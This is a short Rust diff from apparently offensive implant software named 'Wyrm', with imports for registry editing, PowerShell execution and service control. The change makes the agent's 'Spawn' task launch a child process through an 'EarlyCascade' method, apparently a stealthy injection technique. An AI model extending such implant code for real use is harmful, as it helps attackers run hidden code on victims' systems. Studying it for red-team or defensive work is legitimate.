@@ -48,7 +48,7 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    spawn::Spawn,
+    spawn::{Spawn, SpawnMethod},
     utils::{
         comptime::translate_build_artifacts, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
@@ -333,7 +333,11 @@ impl Wyrm {
                 }
                 Command::Spawn => {
                     let path = task.metadata.unwrap();
-                    Spawn::spawn_sibling(&path, &self.current_working_directory);
+                    Spawn::spawn_child(
+                        &path,
+                        &self.current_working_directory,
+                        SpawnMethod::EarlyCascade,
+                    );
                 }
             }
         }
